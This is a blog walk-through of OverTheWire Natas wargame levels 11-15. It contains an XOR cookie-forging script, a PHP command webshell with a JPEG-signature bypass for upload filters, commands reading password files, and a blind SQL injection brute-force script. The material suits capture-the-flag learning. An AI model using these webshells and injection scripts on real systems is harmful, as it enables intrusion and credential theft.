---
layout: post
title: "OverTheWire - Natas Levels 11 - 15"
date: 2017-02-22
description: "Walk-through guide to OverTheWire Natas."
number: "0x0e"
---
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

This is my write-up of the [OverTheWire](http://overthewire.org) wargame [Natas](http://overthewire.org/wargames/natas/) levels 11 - 15. The write-up for levels 0 - 10 can be found [here](/blog/2016/10/05/overthewire-natas). If you notice any problems please [contact](/contact) me to let me know.
 
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 11 ]

This level took me a good amount of time to get through. I had to do a lot of reading about XOR encryption and the PHP functions to figure it out. Even then I had to Google for some help.

The home page displays a title stating 'Cookies are protected with XOR encryption'. 

Looking at the cookie in Burp we see one titled 'data' with the value

{% highlight html %}
data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D 
{% endhighlight %}

So this is Base64 encoded.

When viewing the SRC we can see that in order to view the password we need to set the `showpassword` key of `$data` to `yes`. To do this we need to load the encrypted array into our cookie. So we need the key to encrypt the cookie.

XOR encryption works like this:

{% highlight html %}
Data XOR Key = Encrypted_data 
          and 
Data XOR Encrypted_data = Key
{% endhighlight %}

So we can get the key using this information. 

Using the PHP functions from the SRC we can write

{% highlight php linenos %}
<?php

 $cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw');

 function xor_encrypt($in) {  
   $text = $in;  
   $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));  
   $outText = '';

   // Iterate through each character  
   for($i=0;$i<strlen($text);$i++) {  
   $outText .= $text[$i] ^ $key[$i % strlen($key)];  
   }  
   return $outText;  
 }  
 print xor_encrypt($cookie);
 ?>  
{% endhighlight %}

And when we run it we get

{% highlight shell %}
$ natas11.php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq 
{% endhighlight %}

So we can modify our PHP script to output our encrypted cookie value

{% highlight php linenos %}
<?php

 function xor_encrypt() {  
   $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));  
   $key = "qw8J"

   $outText = '';

   // Iterate through each character  
   for($i=0;$i<strlen($text);$i++) {  
   $outText .= $text[$i] ^ $key[$i % strlen($key)];  
   }  
   return $outText;  
 }  
 print base64_encode(xor_encrypt());
 ?>  
{% endhighlight %}

And when we run it we get

{% highlight shell %}
$ natas11.php
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
{% endhighlight %}

So now we set our cookie value in Burp and forward the request and the password is displayed on the page.

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 12 ]

For this level we need to upload a simple webshell. We can use the following PHP script as a webshell upload

{% highlight php %}
<?php
	system($_GET['cmd']);
?>
{% endhighlight %}

We need to change the file type before it can be run as PHP code. We can make this change with Burp before forwarding the request. 

It creates a random string as a URL for the upload. You can see the filename `5wvclpqf2v.php`.

![](/pictures/natas_1.png){:height="337px" width="586px"}

Once it is uploaded we can navigate to `/5wvclpqf2v.php?cmd=cat /etc/natas_webpass/natas13` and the password is displayed on the screen.

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 13 ]

This level is similar to the previous one in that we need to upload a webshell in lieu of an image file.

However, this level uses the PHP [exif_imagetype()](https://secure.php.net/manual/en/function.exif-imagetype.php) function to determine if the upload is, in fact, an image.

When reading the documentation we can see the function is checking for a signature that corresponds with an image file. Signatures can be found [here](https://en.wikipedia.org/wiki/List_of_file_signatures).

Unfortunately, we can't just copy and paste the text signature into our script like we can with PDFs. So we need to write it to the file using the hex escape (\x):

{% highlight shell %}
$ python
>>> shell = open('shell.php','w')
>>> shell.write('\xFF\xD8\xFF\xE0' + '<?php system($_GET["cmd"]); ?>')
>>> shell.close()
{% endhighlight %}

We can check if it worked 

![](/pictures/natas_2.png){:height="34px" width="263px"}

Success!

Now we can upload as per the previous level, ensuring we change the file extension to `.php` in Burp.

Then we access the URL of the upload 

`/xxxxxx.php?cmd=cat /etc/natas_webpass/natas14`

The password prints on screen, but be sure to remove the signature from the front of it.

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 14 ]

For this level we need to get response from the MySQL server that gives us more than 0 rows. So looks like a SQL injection.

After trying a few combinations I found one that worked

![](/pictures/natas_3.png){:height="106px" width="322px"}

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

\-\-[ Level 15 ]

Another SQL injection level, although I found this one a bit more complex.

The source code for this level tells us that there are `user` and `password` tables in the database, and there is a script that echos back a string if our query returns a row from the database. This is an example of blind SQL injection.

Knowing this, we have to brute force a username and password (both a maximum of 64 characters) to see if a `"This user exists"` string is echoed back.

Assuming the username was `natas16` turned out to be correct as it told us that it existed. So I wrote a Python script to brute force the password incrementally character by character:


{% highlight python linenos %}
#!/bin/python

import requests

url = "http://natas15:**PASSWORD**@natas15.natas.labs.overthewire.org/"

chars = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

passwd_chars = ''
passwd = ''
exists = "This user exists."

for char in chars:
	r = requests.get(url+'?username=natas16" AND password LIKE BINARY "%'+char+'%" "')
	if exists in r.text:
		passwd_chars += char
		print passwd_chars

print 'Brute forcing password..'

for i in range(32):
	for char in passwd_chars:
		r = requests.get(url+'?username=natas16" AND password LIKE BINARY "'+passwd+char+'%" "')
		if exists in r.text:
			passwd += char
			print passwd
{% endhighlight %}			

The first code block narrows down the characters in the password by checking against all characters. This utilises the SQL [BINARY](https://dev.mysql.com/doc/refman/5.5/en/cast-functions.html#operator_binary) and wildcard (%) operators to help match the password to the characters.

The second code block bruteforces the password characters in the correct position (note the absence of the first wildcard operator in the query). Although the database comment in the source code allows for a 64 character password, all other passwords so far have only been 32 character, so I went with that.

{% highlight shell %}
$ python natas15.py 
a
ac
ace
aceh
...
acehijmnpqtwBEHINORW35
acehijmnpqtwBEHINORW356
acehijmnpqtwBEHINORW3569
acehijmnpqtwBEHINORW35690
Brute forcing password..
W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
...
{% endhighlight %}

And there we have it. This took me a while to get the script right, and to get my head around how the queries should work, but I am happy with the final result.


\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

[Levels 0 - 10](/blog/2016/10/05/overthewire-natas)

More levels coming soon...

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
